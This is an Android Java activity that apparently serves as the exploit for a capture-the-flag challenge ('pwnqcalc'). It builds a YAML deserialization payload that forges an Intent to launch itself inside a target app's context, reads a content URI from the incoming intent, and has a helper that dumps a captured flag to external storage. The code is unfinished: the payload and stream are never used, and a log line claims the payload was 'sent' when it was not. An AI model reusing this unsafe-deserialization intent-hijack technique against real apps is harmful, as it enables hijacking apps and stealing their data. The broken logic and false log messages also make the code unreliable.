package com.qwb.pwnqcalc;

import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.os.Environment;
import android.util.Log;
import android.widget.TextView;
import java.io.*;
import java.net.URLEncoder;

public class FlagReceiverActivity extends Activity {
    private static final String TAG = "dilrevx";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Log.d(TAG, "FlagReceiverActivity started in target app context");
        Log.d(TAG, "We have target app permissions now!");

        Uri uri = getIntent().getData();
        exploitViaYamlPayload(uri);


    }
    private void saveFlagToExternal(String flag) {
        try {
            File sdcard = Environment.getExternalStorageDirectory();
            File flagFile = new File(sdcard, "ctf_flag.txt");
            FileWriter writer = new FileWriter(flagFile);
            writer.write("Flag: " + flag);
            writer.close();
            Log.i(TAG, "Flag saved to: " + flagFile.getAbsolutePath());
        } catch (Exception e) {
            Log.e(TAG, "Failed to save flag externally: " + e.getMessage());
        }
    }

    private String readStream(InputStream is) {
        try {
            BufferedReader reader = new BufferedReader(new InputStreamReader(is));
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                sb.append(line);
            }
            reader.close();
            return sb.toString();
        } catch (Exception e) {
            return null;
        }
    }

    public void exploitViaYamlPayload(Uri uri) {
        try {
            // 构造一个包含 YAML 的 expression
            String yamlPayload = "!!android.content.Intent\n" +
                    "action: android.intent.action.VIEW\n" +
                    "component: \"" + getPackageName() + "/.FlagReceiverActivity\"\n" +
                    "flags: 268435456";

            // 将 YAML 作为 expression 注入
            String encodedPayload = URLEncoder.encode(yamlPayload, "UTF-8");

            InputStream is = getContentResolver().openInputStream(uri);
//            is.

            Log.d(TAG, "YAML payload sent via expression");

        } catch (Exception e) {
            Log.e(TAG, "YAML payload attack failed: " + e.getMessage());
        }
    }
}